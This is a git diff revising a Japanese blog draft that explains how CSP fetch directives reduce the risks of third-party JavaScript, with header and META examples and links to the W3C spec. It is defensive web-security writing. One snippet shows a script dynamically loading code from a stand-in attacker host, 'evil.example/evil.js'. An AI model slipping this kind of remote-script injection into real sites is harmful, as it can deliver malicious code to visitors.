@@ -1,12 +1,16 @@
 # CSP（Content Security Policy）Fetch ディレクティブ活用の現実解
 
-こんにちは、エンジニア & 安全確保支援士の中山です。
+こんにちは、プラットフォームエンジニア & 安全確保支援士の中山です。
 
-広告掲載や Web 解析や SNS 連携等を目的として、しばしば Web Application に 3rd-party JavaScript を導入することがあります。一方で 3rd-party JavaScript には Web Application を利用するユーザーに悪影響を与えるリスクが存在するため、導入とあわせたリスク対策も必要となります。そこで、今回の記事では Content Security Policy（以下 CSP）の Fetch ディレクティブを活用した Web Application のセキュリティー強化の取り組みについてお伝えしたいと思います。
+Web 解析や SNS 連携、広告掲載等を目的として Web サイトにはしばしば 3rd-party JavaScript が導入されることがあります。一方で 3rd-party JavaScript には Web サイトを閲覧するユーザーに悪影響を与えるリスクが存在するため、その導入とあわせたリスク対策も必要となります。そこで、今回の記事では Content Security Policy（以下 CSP）の Fetch ディレクティブを活用した Web サイトのセキュリティー強化の取り組みについてお伝えしたいと思います。
 
 ## CSP の Fetch ディレクティブとは
 
-詳しくは [W3C 仕様](https://www.w3.org/TR/CSP3/) をご確認頂くとして、CSP の Fetch ディレクティブとはサブリソースの読み込みやインライン JavaScript の実行を制限するための Web ブラウザに対する指示のことです。Web Application が
+詳しくは [W3C 仕様](https://www.w3.org/TR/CSP3/) をご確認頂くとして、CSP の Fetch ディレクティブとはサブリソースの読み込みやインライン JavaScript の実行を制限するための Web ブラウザに対する指示のことで、概念を絵にしたものがこちらです。
+
+★ここも絵を、Fetch もかく
+
+例えば Web サイトが
 
 ```
 Content-Security-Policy: script-src 'self'
@@ -18,17 +22,29 @@ Content-Security-Policy: script-src 'self'
 <meta http-equiv="Content-Security-Policy" content="script-src 'self'" />
 ```
 
-のような META 要素をコンテンに記載することで、指示に応じた制限が適用され、結果として以下のようなセキュリティー上の効果が期待できます。
+のような META 要素を定義している場合、CSP の Fetch ディレクティブの内容に応じた制限が適用され、
 
 - XSS リスクの軽減
-- ある 3rd-party JavaScript から piggyback で読み込まれる意図しない 3rd-party JavaScript の実行抑制
 - 外部ドメインへの意図しないデータ転送の抑制
+- ある事業者の 3rd-party JavaScript から読み込まれる別な事業者の 3rd-party JavaScript の実行抑制
 
-## メディアのセキュリティー課題と対策
+のようなセキュリティー上の効果が期待できます。
 
-Web Application のセキュリティー対策と CSP Fetch ディレクティブの関係性についてもう少し詳しく述べたいと思います。
+蛇足ですが META 要素に関しては [W3C 仕様](https://www.w3.org/TR/CSP3/) に
 
-Web Application が 3rd-party JavaScript（例えば広告タグや Web 解析ツール、SNS 連携機能等）を読み込むとき、もし 3rd-party に悪意があったり、悪意はなくとも別な攻撃者に改変されていた場合、Web Application 上に表示されるデータが盗まれたり [フィッシングサイトに誘導](https://blog.techscore.com/entry/2022/08/24/150000) さてしまったり、といったリスクが発生します。
+> The Content-Security-Policy-Report-Only header is not supported inside a meta element.
+
+とあり、一部の機能が利用できません。その [背景に関する議論](https://github.com/w3c/webappsec-csp/issues/277) では
+
+> I really wish we'd stop with meta-element based policies.
+
+のような意見も出ているため利用には慎重な検討が必要ですね。
+
+## Web サイトのセキュリティー課題と対策
+
+表記についてもう少し掘り下げてみます。
+
+Web サイトが 3rd-party JavaScript を読み込むとき、もしその 3rd-party JavaScript を提供する事業者に悪意があったり、悪意はなくとも別な攻撃者によって CDN やリポジトリ上のコードが改変されていた場合、Web サイト上のデータが盗まれたり [フィッシングサイトに誘導](https://blog.techscore.com/entry/2022/08/24/150000) されてしまう、などのリスクが発生します。
 
 <img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec01.png' />
 
@@ -36,7 +52,7 @@ Web Application が 3rd-party JavaScript（例えば広告タグや Web 解析�
 
 <img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec02.png' />
 
-ただし 3rd-party JavaScript がその目的を達成するために Web Application の DOM にアクセスする必要がある場合（例えば広告のビューアビリティー計測など）、ドメインを分離する対策は採用できません。とはいえ、信頼できる安全な 3rd-party JavaScript ならば問題はないでしょう。
+ただし 3rd-party JavaScript がその目的を達成するために Web サイトの DOM にアクセスする必要がある場合（例えば広告のビューアビリティー計測など）、ドメインを分離する対策は採用できません。とはいえ、信頼できる安全な 3rd-party JavaScript ならば問題はないでしょう。
 
 <img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec03.png' />
 
@@ -44,7 +60,7 @@ Web Application が 3rd-party JavaScript（例えば広告タグや Web 解析�
 
 <img src='https://raw.githubusercontent.com/nakayama-kazuki/202x/main/CSP/sec04.png' />
 
-例えば Web Application が以下のマークアップを含み
+例えば Web サイトが以下のマークアップを含み
 
 ```
 <script src='https://hoge.example/hoge.js'></script>
@@ -55,7 +71,8 @@ Web Application が 3rd-party JavaScript（例えば広告タグや Web 解析�
 ```
 let script = document.createElement('SCRIPT');
 script.src = 'https://evil.example/evil.js';
-document.getElementsByTagName('SCRIPT').item(0).parentNode.appendChild(script);
+let targetNode = document.getElementsByTagName('SCRIPT').item(0);
+targetNode.parentNode.appendChild(script);
 ```
 
 こうした 3rd-party JavaScript 読み込みが複数回実行されることもあり、そうなるともはや安全性の確認は困難です。行儀の悪い事業者の 3rd-party JavaScript がコンテンツ情報を勝手に収集している … なんてこともあるかもしれません。
@@ -70,7 +87,7 @@ document.getElementsByTagName('SCRIPT').item(0).parentNode.appendChild(script);
 
 Same Origin Policy と
 
-一方でメディアサービスなどの Web Application の場合は多くの 3rd-party JavaScript を導入しています。導入を把握している 3rd-party JavaScript の範囲ならば管理することは可能かもしれませんが、
+一方でメディアサービスなどの Web サイトの場合は多くの 3rd-party JavaScript を導入しています。導入を把握している 3rd-party JavaScript の範囲ならば管理することは可能かもしれませんが、
 
 
 例えば総務省の
